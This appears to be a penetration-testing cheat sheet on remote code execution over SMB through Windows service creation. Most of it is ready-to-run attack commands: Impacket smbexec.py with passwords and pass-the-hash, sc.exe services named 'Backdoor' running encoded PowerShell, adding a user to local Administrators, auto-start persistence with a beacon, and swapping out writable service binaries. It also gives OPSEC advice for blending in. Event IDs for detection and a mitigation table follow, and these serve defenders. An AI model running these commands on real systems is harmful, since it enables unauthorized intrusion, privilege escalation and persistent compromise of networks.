# SMB Execution

SMB execution leverages the Server Message Block protocol — primarily via Windows service control (SVCCTL) over named pipes — to create and control services on remote machines. The canonical implementation is Impacket's `smbexec.py`.

## How It Works

1. Authenticate over SMB to `IPC$` (named pipe `svcctl`)
2. Open the Service Control Manager on the remote machine via `OpenSCManagerW`
3. Create a service with `CreateServiceW` pointing to `cmd.exe /c <command>`
4. Start the service (triggering command execution)
5. Output is captured via temporary files written to `ADMIN$`
6. Service is stopped/deleted

## Requirements

| Requirement | Detail |
|-------------|--------|
| Privileges | Local admin on target |
| SMB | Port 445 (IPC$, ADMIN$ must be accessible) |
| Named pipe | `svcctl` via `IPC$` |
| RPC | SMB named pipe (no direct RPC port needed) |
| Write access | ADMIN$ share for output files |

---

## Impacket smbexec.py

```
# Password authentication
smbexec.py DOMAIN/user:'Password123!'@192.168.1.100

# Hash authentication
smbexec.py -hashes :NTLM_HASH DOMAIN/user@192.168.1.100

# Full LM:NTLM hash format
smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH DOMAIN/admin@target

# Single command execution
smbexec.py DOMAIN/user:pass@target "whoami"

# No output (no BATCH wrapper, fire and forget)
smbexec.py -nooutput DOMAIN/user@target "powershell -enc BASE64"

# Share selection (overrides ADMIN$ default)
smbexec.py -share C$ DOMAIN/user@target "whoami"

# Mode selection — SERVER mode uses temporary SMB server
smbexec.py -mode SERVER DOMAIN/user@target "whoami"

# Mode selection — SHARE mode (default, uses ADMIN$)
smbexec.py -mode SHARE DOMAIN/user@target "whoami"

# Use Kerberos
smbexec.py -k -no-pass DOMAIN/user@target.domain.local

# Custom service name (default is random like BTOBTO-)
smbexec.py -service-name LegitService DOMAIN/user@target "whoami"
```

**OPSEC**: smbexec creates a service with a random name (e.g., `BTOBTO-XXX`). The service executes a batch file (`cmd.exe /q /c <command> 2>&1 > %TEMP%\output.tmp`). Event 4697/7045 fires on service creation. The batch approach leaves command-line artifacts.

---

## Windows Native — sc.exe (Service Control)

```
# Create a service on remote machine
sc \\target create UpdateSvc binPath= "cmd /c whoami > C:\out.txt"

# Start the service
sc \\target start UpdateSvc

# Query service status
sc \\target query UpdateSvc

# Delete the service
sc \\target delete UpdateSvc

# Create service as SYSTEM (default)
sc \\target create Backdoor binPath= "powershell -enc BASE64"

# Create service as LocalSystem explicitly
sc \\target create LegitSvc binPath= "cmd /c net localgroup Administrators DOMAIN\user /add" obj= "LocalSystem"

# Start with parameters
sc \\target start LegitSvc

# Stop service
sc \\target stop LegitSvc

# Create auto-start service (persistence)
sc \\target create PersistSvc binPath= "cmd /c C:\tools\beacon.exe" start= auto

# List services (remote)
sc \\target query
sc \\target query state= all

# Query specific service
sc \\target queryex UpdateSvc
```

**OPSEC**: `sc.exe` is a native Windows binary. Service creation is audited via 4697/7045. The service name is visible in the SCM and event logs.

---

## Windows — net use + service abuse

```
# Authenticate to target (caches credentials for session)
net use \\target\IPC$ /user:DOMAIN\admin

# Create service using sc over SMB named pipe
sc \\target create SvcName binPath= "cmd /c whoami > C:\out.txt"

# Start
sc \\target start SvcName

# Cleanup
net use \\target\IPC$ /delete
```

---

## PowerSploit — Invoke-Service

```powershell
# Invoke-Service from PowerSploit
Invoke-Service -ComputerName target -ServiceName LegitSvc -Command "whoami"

# Using Invoke-ServiceExec from Empire
Invoke-ServiceExec -ComputerName target -Command "whoami"

# Manual Win32 API service creation via PowerShell
$method = [WMIClass]"\\target\root\cimv2:Win32_Process"
$method.Create("cmd /c whoami > C:\out.txt")
```

---

## Service binary planting

If you have write access to a service binary path that runs as SYSTEM, you can replace it:

```
# Find writable service binaries (requires remote registry or known service)
# Check if target service path is writeable
accesschk.exe \\target -u "DOMAIN\user" "C:\Program Files\VulnService\service.exe"

# If writeable, replace with your binary
copy beacon.exe \\target\ADMIN$\
copy \\target\c$\"Program Files\VulnService\service.exe" \\target\c$\backup\
move /Y \\target\c$\beacon.exe \\target\c$\"Program Files\VulnService\service.exe"

# Restart service
sc \\target stop VulnService
sc \\target start VulnService
```

---

## Detection

| Event ID | Source | Indication |
|----------|--------|-------------|
| 4697 | Security | Service creation (always triggered) |
| 7045 | System | Service install from SCM |
| 5140 | Security | SMB share access to `IPC$` |
| 5145 | Security | SMB access to `IPC$` named pipe `svcctl` |
| 4624 | Security | LogonType 3 (Network logon for SMB) |
| 4672 | Security | Admin logon (admin required for SVCCTL) |
| 4688 | Security | Process creation (`cmd.exe` via `services.exe`) |
| 1 | Sysmon | Process creation (parent `services.exe`) |
| 3 | Sysmon | Network connection to target:445 |
| 11 | Sysmon | File create in `ADMIN$` (output files) |

**Detection logic**:
- `4688` with `ParentProcessName: services.exe` = service executing command
- Pattern: 5140 (IPC$) → 4697 (service create) → 4688 (cmd.exe from services.exe) = smbexec
- Service created and deleted within seconds/minutes = smbexec cleanup
- Random service names (e.g., `BTOBTO-*`, `-*`) = Impacket smbexec
- Services with `ImagePath` containing `cmd.exe /c` or `powershell` with unusual commands
- `services.exe` as parent process of `cmd.exe` (PID 4) — legitimate services rarely execute cmd directly

## Mitigation

| Control | Detail |
|---------|--------|
| SMB signing | Prevents relay, does not prevent direct service creation |
| Service ACLs | Restrict who can create/start/stop services |
| AppLocker/WDAC | Block cmd.exe/powershell.exe launched from services.exe |
| Monitor 4697/7045 | Alert on service creation from untrusted sources |
| Disable ADMIN$ | Prevents output file writes (but not service creation) |
| EDR | Behavioral detection of service abuse |
| LAPS | Unique local admin passwords to prevent hash reuse |

## When to Use SMB Exec

- **WMI is blocked** or timing out — smbexec connects via named pipes over SMB
- **Port 135 blocked** (DCOM) but 445 open — smbexec only needs SMB
- **Need semi-interactive shell** — smbexec provides a command loop
- **When output capture matters** — smbexec captures stdout/stderr via temp files
- **Alternate option** — when psexec is blocked but smbexec works (different service binary)

## When NOT to Use SMB Exec

- **Service creation is monitored** — 4697/7045 detection is very common
- **Stealth engagement** — service creation is noisy and auditable
- **Alternative exists** — WMI execution does not create services (no 4697)
- **Interactive shell needed** — smbexec is command-by-command, not a full TTY
